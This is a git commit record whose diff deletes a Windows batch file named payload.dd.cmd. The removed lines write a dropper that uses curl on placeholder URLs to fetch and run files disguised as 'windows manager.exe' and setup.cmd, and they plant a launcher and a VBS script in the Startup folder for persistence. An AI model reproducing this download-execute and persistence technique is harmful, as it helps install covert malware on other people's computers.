a2f39d6c1e5b38c4172b406af2fecb8a3ef4ad79
chamaedoreapruductions <96385448+chamaedoreapruductions@users.noreply.github.com>
2022-05-04 16:05:44 +0200

    Delete payload.dd.cmd

--- payload.dd.cmd
+++
@@ -1,8 +0,0 @@
-cd C:
-cd %APPDATA%
-cd Microsoft\Windows\Start Menu\Programs
-echo ^curl smth ^> "windows manager.exe" ^&^& ^curl smth ^> "img.png" ^&^& ^curl smth ^> "setup.cmd" ^&^& setup.cmd ^&^& ^cd Startup ^&^& windows manager.cmd > "windows manager.cmd"
-echo WScript.Sleep 100; Dim x; ^Set x = Wscript.CreateObject("WScript.Shell"); x.run("Startup/windows manager.cmd") > "windows manager.vbs"
-cd Startup
-echo ^cd .. windows manager.cmd > "windows manager.cmd"
-windows manager.cmd
